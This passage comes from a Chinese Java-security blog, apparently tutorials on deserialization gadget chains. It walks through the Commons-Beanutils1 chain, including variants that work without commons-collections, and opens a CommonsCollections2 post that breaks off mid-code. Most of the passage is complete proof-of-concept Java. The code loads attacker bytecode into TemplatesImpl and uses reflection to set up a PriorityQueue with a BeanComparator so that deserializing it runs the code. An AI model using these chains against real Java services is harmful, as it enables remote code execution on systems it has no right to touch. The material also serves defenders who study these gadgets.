<p>可以看到在**BeanComparator.compare()**方法中，会先传入两个对象</p>
<p>如果<strong>property</strong>为空，则会比较这两个对象，反之，则用 <strong>PropertyUtils.getProperty</strong>分别取这两个对象的<strong>property</strong>属性，比较属性的值。</p>
<p>看到<strong>compare()<strong>方法，就可以联想到</strong>CC2</strong>链的<strong>PriorityQueue</strong>类的反序列化就调用了<strong>compare()<strong>方法，我们只需要本来要传进去优先队列</strong>PriorityQueue</strong>中的<strong>transformingComparator</strong>对象换成这里的<strong>BeanComparator</strong>对象即可</p>
<h1 id="0x03-构造利用链"><a href="#0x03-构造利用链" class="headerlink" title="0x03 构造利用链"></a>0x03 构造利用链</h1><h2 id="有CC依赖"><a href="#有CC依赖" class="headerlink" title="有CC依赖"></a>有<strong>CC</strong>依赖</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">3.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>

<p>首先还是创建<strong>TemplateImpl</strong>恶意对象</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射修改属性</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">nameFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameFiled.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//获取字节码</span></span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\tmp\\classes\\CalcTest.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesFiled.set(templates,codes);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryFiled.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure></div>

<p>然后，实例化<strong>BeanComparator</strong>，<strong>BeanComparator</strong>构造函数为<strong>空</strong>时，默认的<strong>property</strong>就是空</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">BeanComparator</span> <span class="variable">objectBeanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br></pre></td></tr></table></figure></div>

<p>然后用这个<strong>BeanComparator</strong>实例化优先队列<strong>PriorityQueue</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(BeanComparator);</span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure></div>

<p>这边先传入没有危害的可比较对象，且<strong>property</strong>为空是防止报错</p>
<p>而我们只需在序列化和反序列化之前，利用反射，将<strong>property</strong>改为<strong>outputProperties</strong>，以及将队列中的<strong>1</strong>和<strong>2</strong>改成恶意的<strong>TemplatesImpl</strong>对象即可</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//property ---&gt; outputProperties</span></span><br><span class="line">Class&lt;BeanComparator&gt; beanComparatorClass = BeanComparator.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">property</span> <span class="operator">=</span> beanComparatorClass.getDeclaredField(<span class="string">&quot;property&quot;</span>);</span><br><span class="line">property.setAccessible(<span class="literal">true</span>);</span><br><span class="line">property.set(BeanComparator,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"><span class="comment">//queue ---&gt; templates</span></span><br><span class="line">Class&lt;PriorityQueue&gt; priorityQueueClass = PriorityQueue.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> priorityQueueClass.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">comparator.set(priorityQueue, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);</span><br></pre></td></tr></table></figure></div>

<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//CC3</span></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射修改属性</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">nameFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameFiled.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//获取字节码</span></span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\tmp\\classes\\CalcTest.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesFiled.set(templates,codes);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryFiled.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//PropertyUtils.getProperty(templates,&quot;outputProper</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//CB</span></span><br><span class="line">BeanComparator&lt;Object&gt; objectBeanComparator = <span class="keyword">new</span> <span class="title class_">BeanComparator</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">//CC2</span></span><br><span class="line">PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(BeanComparator);</span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">Class&lt;BeanComparator&gt; beanComparatorClass = BeanComparator.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">property</span> <span class="operator">=</span> beanComparatorClass.getDeclaredField(<span class="string">&quot;property&quot;</span>);</span><br><span class="line">property.setAccessible(<span class="literal">true</span>);</span><br><span class="line">property.set(BeanComparator,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">Class&lt;PriorityQueue&gt; priorityQueueClass = PriorityQueue.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> priorityQueueClass.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">comparator.set(priorityQueue, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);</span><br><span class="line"></span><br><span class="line">serialize(priorityQueue);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h2 id="无CC依赖"><a href="#无CC依赖" class="headerlink" title="无CC依赖"></a>无<strong>CC</strong>依赖</h2><p>当把<strong>CC</strong>依赖去掉后执行，会爆出一个错误</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">org/apache/commons/collections/comparators/ComparableComparator</span><br></pre></td></tr></table></figure></div>

<p>原因是因为在<strong>BeanComparator</strong>的构造函数里传了这个<strong>ComparableComparator</strong></p>
<p>那就看看这个<strong>ComparableComparator</strong>是什么吧</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.comparators.ComparableComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">( String property )</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>( property, ComparableComparator.getInstance() );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这段代码的作用是根据指定的属性创建一个基于属性的比较器<strong>BeanComparator</strong>，用于比较<strong>JavaBean</strong>对象。</p>
<p>如果传递的属性为 <strong>null</strong>，则使用默认的<strong>ComparableComparator</strong>比较器，该比较器通过对象的自然顺序进行比较。</p>
<p>但是还有这么一个构造函数</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">( String property, Comparator comparator )</span> &#123;</span><br><span class="line">    setProperty( property );</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.comparator = comparator;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.comparator = ComparableComparator.getInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>那我们可以自己传一个用来代替</p>
<p>既然此时没有<strong>ComparableComparator</strong>，我们需要找到一个类来替换，它需要满足下面这几个条件： </p>
<ul>
<li>实现<strong>java.util.Comparator</strong>接口 </li>
<li>实现<strong>java.io.Serializable</strong>接口 </li>
<li><strong>Java</strong>、<strong>shiro</strong>或<strong>commons-beanutils</strong>自带，且兼容性强</li>
</ul>
<p>通过<strong>IDEA</strong>的功能，我们找到一个<strong>CaseInsensitiveComparator</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Comparator&lt;String&gt; CASE_INSENSITIVE_ORDER</span><br><span class="line">                                     = <span class="keyword">new</span> <span class="title class_">CaseInsensitiveComparator</span>();</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">CaseInsensitiveComparator</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Comparator</span>&lt;String&gt;, java.io.Serializable &#123;</span><br><span class="line">    <span class="comment">// use serialVersionUID from JDK 1.2.2 for interoperability</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">8575799808933029326L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(String s1, String s2)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n1</span> <span class="operator">=</span> s1.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n2</span> <span class="operator">=</span> s2.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> Math.min(n1, n2);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; min; i++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c1</span> <span class="operator">=</span> s1.charAt(i);</span><br><span class="line">            <span class="type">char</span> <span class="variable">c2</span> <span class="operator">=</span> s2.charAt(i);</span><br><span class="line">            <span class="keyword">if</span> (c1 != c2) &#123;</span><br><span class="line">                c1 = Character.toUpperCase(c1);</span><br><span class="line">                c2 = Character.toUpperCase(c2);</span><br><span class="line">                <span class="keyword">if</span> (c1 != c2) &#123;</span><br><span class="line">                    c1 = Character.toLowerCase(c1);</span><br><span class="line">                    c2 = Character.toLowerCase(c2);</span><br><span class="line">                    <span class="keyword">if</span> (c1 != c2) &#123;</span><br><span class="line">                        <span class="comment">// No overflow because of numeric promotion</span></span><br><span class="line">                        <span class="keyword">return</span> c1 - c2;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n1 - n2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/** Replaces the de-serialized object. */</span></span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">readResolve</span><span class="params">()</span> &#123; <span class="keyword">return</span> CASE_INSENSITIVE_ORDER; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>CaseInsensitiveComparator</strong>类是<strong>java.lang.String</strong>类下的一个内部私有类</p>
<p>我们只需要通过<strong>String.CASE_INSENSITIVE_ORDER</strong>即可拿到上下文中的<strong>CaseInsensitiveComparator</strong>对象，用它来实例化 <strong>BeanComparator</strong></p>
<p>而且后面添加的是两个整形对象，不能转换成字符串类型，所以记得改成字符串类型的对象</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">BeanComparator</span> <span class="variable">BeanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>,String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(BeanComparator</span><br><span class="line">    priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    priorityQueue.add(<span class="string">&quot;2&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//CC3</span></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射修改属性</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">nameFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameFiled.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//获取字节码</span></span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\tmp\\classes\\CalcTest.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesFiled.set(templates,codes);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryFiled.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//PropertyUtils.getProperty(templates,&quot;outputProper</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//CB</span></span><br><span class="line"><span class="type">BeanComparator</span> <span class="variable">BeanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>,String.CASE_INSENSITIVE_ORDER);</span><br><span class="line"></span><br><span class="line"><span class="comment">//CC2</span></span><br><span class="line">PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(BeanComparator);</span><br><span class="line">priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">priorityQueue.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line">Class&lt;BeanComparator&gt; beanComparatorClass = BeanComparator.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">property</span> <span class="operator">=</span> beanComparatorClass.getDeclaredField(<span class="string">&quot;property&quot;</span>);</span><br><span class="line">property.setAccessible(<span class="literal">true</span>);</span><br><span class="line">property.set(BeanComparator,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">Class&lt;PriorityQueue&gt; priorityQueueClass = PriorityQueue.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> priorityQueueClass.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">comparator.set(priorityQueue, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);</span><br><span class="line"></span><br><span class="line">serialize(priorityQueue);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure></div>



<p>当依赖为<strong>commons-beanutils 1.9.2</strong>时，还可以这么写</p>
<p>此时我们使用的替代类是<strong>AttrCompare</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AttrCompare</span> <span class="keyword">implements</span> <span class="title class_">Comparator</span>&lt;Attr&gt;, Serializable &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到<strong>AttrCompare</strong>是符合要求的</p>
<p>那我们只需要利用反射，将<strong>BeanComparator</strong>中的<strong>comparator</strong>赋值为**new AttrCompare()**即可</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射修改属性</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">nameFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameFiled.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//获取字节码</span></span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\tmp\\classes\\CalcTest.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesFiled.set(templates,codes);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryFiled.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BeanComparator&lt;Object&gt; beanComparator = <span class="keyword">new</span> <span class="title class_">BeanComparator</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(beanComparator);</span><br><span class="line">priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">priorityQueue.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line">Class&lt;BeanComparator&gt; beanComparatorClass = BeanComparator.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">property</span> <span class="operator">=</span> beanComparatorClass.getDeclaredField(<span class="string">&quot;property&quot;</span>);</span><br><span class="line">property.setAccessible(<span class="literal">true</span>);</span><br><span class="line">property.set(beanComparator,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> beanComparatorClass.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">declaredField.set(beanComparator,<span class="keyword">new</span> <span class="title class_">AttrCompare</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Class&lt;PriorityQueue&gt; priorityQueueClass = PriorityQueue.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> priorityQueueClass.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">comparator.set(priorityQueue, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);</span><br><span class="line"></span><br><span class="line">serialize(priorityQueue);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure></div>



<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><h1 id="0x05-参考资料"><a href="#0x05-参考资料" class="headerlink" title="0x05 参考资料"></a>0x05 参考资料</h1>]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Commons-Beanutils1</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonsCollections2</title>
    <url>/2023/09/21/Java%E5%AE%89%E5%85%A8/CommonsCollection2%E5%88%A9%E7%94%A8%E9%93%BE/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p><strong>CC2</strong>这条链其实是在<strong>CC4</strong>的基础上，利用<strong>InvokerTransformer</strong>类去调用**TemplatesImpl.newTransformer()**方法</p>
<p>代理原本利用<strong>InstantiateTransformer</strong>类将<strong>TrAXFilter</strong>类进行初始化，实现调用**TemplatesImpl.newTransformer()**方法</p>
<h1 id="0x01-利用链分析"><a href="#0x01-利用链分析" class="headerlink" title="0x01 利用链分析"></a>0x01 利用链分析</h1><h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>所以，只需要将<strong>CC4</strong>中的</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>更改为</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br></pre></td></tr></table></figure></div>

<p>构造出<strong>InvokerTransformer</strong>去调用<strong>newTransformer</strong>方法</p>
<h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>并且我们这里没有在使用<strong>Transformer</strong>数组，所以也就无法使用<strong>ConstantTransformer</strong>来初始化变量，因此需要接收外部的变量。</p>
<p>而在<strong>Compare()<strong>中，队列里的参数将作为参数传入</strong>transform()<strong>方法里，这里就是传给</strong>newTransformer</strong>的参数</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="keyword">final</span> I obj1, <span class="keyword">final</span> I obj2)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>⼀样实例化<strong>PriorityQueue</strong>，而且此时**this.transformer.transform(obj1)**用的是传入的第一个对象作为参数</p>
<p>所以此时向队列⾥添加的元素就是我们前⾯创建的<strong>TemplatesImpl</strong>对象了</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">priorityQueue.add(templates);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure></div>

<p>也可以图方便将两个都设置为<strong>TemplatesImpl</strong>对象</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射修改属性</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">nameFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameFiled.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//获取字节码</span></span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\tmp\\classes\\CalcTest.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesFiled.set(templates,codes);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryFiled.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span 